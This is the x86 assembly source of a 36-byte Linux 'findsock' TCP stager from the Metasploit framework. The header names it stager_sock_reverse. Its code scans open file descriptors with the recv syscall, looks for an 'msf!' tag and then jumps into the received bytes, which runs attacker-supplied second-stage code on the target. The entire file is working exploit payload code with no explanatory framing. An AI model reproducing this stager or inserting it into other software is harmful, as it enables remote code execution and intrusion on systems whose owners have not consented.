;;
; 
;        Name: stager_sock_reverse
;        Size: 36 bytes
;   Qualities: Nothing Special
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux findsock TCP stager.
;
;        File descriptor in edi
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

initialize_stack:
	push ebx
	mov  esi, esp
	push byte 0x40
	mov  bh, 0xa
	push ebx
	push esi
	push ebx
	mov  ecx, esp
	xchg bh, bl

findtag:
	inc  word [ecx]
	push byte 0x66
	pop  eax
	int  0x80
	cmp  dword [esi], 0x2166736d
	jnz  findtag
	pop  edi
	cld
	lodsd
	jmp  esi